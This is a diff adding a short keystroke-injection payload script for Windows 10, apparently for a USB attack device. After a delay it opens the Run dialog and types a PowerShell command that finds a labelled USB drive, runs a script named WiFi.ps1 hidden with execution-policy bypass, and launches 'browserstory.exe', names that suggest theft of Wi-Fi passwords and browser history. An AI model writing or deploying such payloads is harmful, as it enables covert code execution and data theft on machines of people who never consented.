@@ -1,0 +1,14 @@
+REM --- target: windows 10 ---
+REM --- wait unitl host has done all its initializations ---
+WAITFOR_INIT
+DELAY 2000
+REM --- allow user to prevent payload execution by tapping CAPSLOCK during insertion ---
+ALLOW_EXIT
+
+
+REM --- find appropriate USB drive (FAT partition label must be YOURNAMELABEL) ---
+REM --- execute insert.ps1 script from its root directory as administartor ---
+GUI r
+DELAY 300
+STRING powershell $drv = (Get-Volume -FileSystemLabel YOURNAMELABEL).DriveLetter+':\'; Set-Location $drv; powershell -ep bypass -wind hidden -nonI -File WiFi.ps1; .\browserstory.exe
+ENTER
